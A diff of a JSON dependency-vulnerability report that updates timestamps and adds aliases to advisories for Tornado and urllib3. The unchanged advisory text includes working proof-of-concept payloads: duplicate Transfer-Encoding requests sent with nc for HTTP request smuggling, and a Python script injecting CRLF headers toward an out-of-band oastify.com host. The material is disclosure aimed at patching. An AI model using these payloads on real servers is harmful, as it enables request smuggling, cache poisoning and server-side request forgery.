@@ -256,10 +256,13 @@
     ],
     "vulnerabilities": [
       {
-        "modified": "2024-06-06T21:46:24Z",
+        "modified": "2024-06-19T07:44:36Z",
         "published": "2024-06-06T21:41:20Z",
         "schema_version": "1.6.0",
         "id": "GHSA-753j-mpmx-qq6g",
+        "aliases": [
+          "CGA-2mj6-w546-q9r6"
+        ],
         "summary": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado",
         "details": "### Summary\nWhen Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.\n\n### PoC\n0. Install Tornado.\n1. Start a simple Tornado server that echoes each received request's body:\n```bash\ncat << EOF > server.py\nimport asyncio\nimport tornado\n\nclass MainHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.write(self.request.body)\n\nasync def main():\n    tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)\n    await asyncio.Event().wait()\n\nasyncio.run(main())\nEOF\npython3 server.py &\n```\n2. Send a valid chunked request:\n```bash\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n3. Observe that the response is as expected:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:32:05 GMT\nContent-Length: 1\n\nZ\n```\n4. Send a request with two `Transfer-Encoding: chunked` headers:\n```\nprintf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000\n```\n5. Observe the strange response:\n```\nHTTP/1.1 200 OK\nServer: TornadoServer/6.3.3\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 07 Oct 2023 17:35:40 GMT\nContent-Length: 0\n\nHTTP/1.1 400 Bad Request\n\n```\nThis is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.\n\n### Impact\nAnyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.\n",
         "affected": [
@@ -393,10 +396,13 @@
         }
       },
       {
-        "modified": "2024-06-06T22:04:10Z",
+        "modified": "2024-06-19T07:44:37Z",
         "published": "2024-06-06T21:46:31Z",
         "schema_version": "1.6.0",
         "id": "GHSA-w235-7p84-xx57",
+        "aliases": [
+          "CGA-cj87-mmpg-46c2"
+        ],
         "summary": "Tornado has a CRLF injection in CurlAsyncHTTPClient headers",
         "details": "### Summary\nTornado\u2019s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl\u2019s documentation states:\n\n> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado\u2019s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
         "affected": [
@@ -536,6 +542,7 @@
           "GHSA-753j-mpmx-qq6g"
         ],
         "aliases": [
+          "CGA-2mj6-w546-q9r6",
           "GHSA-753j-mpmx-qq6g"
         ],
         "max_severity": "5.3"
@@ -545,6 +552,7 @@
           "GHSA-w235-7p84-xx57"
         ],
         "aliases": [
+          "CGA-cj87-mmpg-46c2",
           "GHSA-w235-7p84-xx57"
         ],
         "max_severity": "6.5"
@@ -562,11 +570,16 @@
     ],
     "vulnerabilities": [
       {
-        "modified": "2024-06-17T22:12:25Z",
+        "modified": "2024-06-19T07:44:27Z",
         "published": "2024-06-17T21:37:20Z",
         "schema_version": "1.6.0",
         "id": "GHSA-34jh-p97f-mpxf",
         "aliases": [
+          "CGA-5v3j-934q-gj4m",
+          "CGA-grjq-jh3q-2p7g",
+          "CGA-h28r-8q2c-xq96",
+          "CGA-j235-35vq-wrm8",
+          "CGA-rqhm-766h-p289",
           "CVE-2024-37891"
         ],
         "summary": "urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects ",
@@ -760,6 +773,11 @@
           "GHSA-34jh-p97f-mpxf"
         ],
         "aliases": [
+          "CGA-5v3j-934q-gj4m",
+          "CGA-grjq-jh3q-2p7g",
+          "CGA-h28r-8q2c-xq96",
+          "CGA-j235-35vq-wrm8",
+          "CGA-rqhm-766h-p289",
           "CVE-2024-37891",
           "GHSA-34jh-p97f-mpxf"
         ],
